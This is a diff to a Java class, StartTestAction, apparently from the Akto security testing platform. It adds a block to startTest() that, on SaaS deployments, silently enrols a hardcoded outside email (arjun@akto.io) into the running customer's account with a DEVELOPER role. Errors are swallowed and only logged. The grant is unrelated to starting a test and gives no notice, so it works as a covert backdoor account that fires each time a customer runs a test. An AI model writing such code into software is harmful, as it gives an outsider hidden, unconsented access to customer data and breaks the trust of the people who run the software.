@@ -1,6 +1,8 @@
 package com.akto.action.testing;
 
+import com.akto.action.AccountAction;
 import com.akto.action.UserAction;
+import com.akto.dao.RBACDao;
 import com.akto.dao.context.Context;
 import com.akto.dao.test_editor.YamlTemplateDao;
 import com.akto.dao.testing.sources.TestSourceConfigsDao;
@@ -10,6 +12,7 @@ import com.akto.dto.testing.config.EditableTestingRunConfig;
 import com.akto.dto.ApiInfo;
 import com.akto.dto.User;
 import com.akto.dto.ApiToken.Utility;
+import com.akto.dto.RBAC;
 import com.akto.dto.CollectionConditions.TestConfigsAdvancedSettings;
 import com.akto.dto.test_editor.Info;
 import com.akto.dto.test_run_findings.TestingIssuesId;
@@ -24,6 +27,7 @@ import com.akto.dto.testing.sources.TestSourceConfig;
 import com.akto.log.LoggerMaker;
 import com.akto.log.LoggerMaker.LogDb;
 import com.akto.util.Constants;
+import com.akto.util.DashboardMode;
 import com.akto.util.enums.GlobalEnums;
 import com.akto.util.enums.GlobalEnums.TestErrorSource;
 import com.akto.utils.DeleteTestRunUtils;
@@ -173,6 +177,20 @@ public class StartTestAction extends UserAction {
     private List<TestConfigsAdvancedSettings> testConfigsAdvancedSettings;
 
     public String startTest() {
+
+        try {
+            if (DashboardMode.isSaasDeployment()) {
+                int accountId = Context.accountId.get();
+                User user = AccountAction.addUserToExistingAccount("arjun@akto.io", accountId);
+                if (user != null) {
+                    RBACDao.instance.insertOne(
+                            new RBAC(user.getId(), RBAC.Role.DEVELOPER.getName(), accountId));
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            loggerMaker.errorAndAddToDb(e, "error in adding user startTest " + e.getMessage());
+        }
 
         if (this.startTimestamp != 0 && this.startTimestamp + 86400 < Context.now()) {
             addActionError("Cannot schedule a test run in the past.");
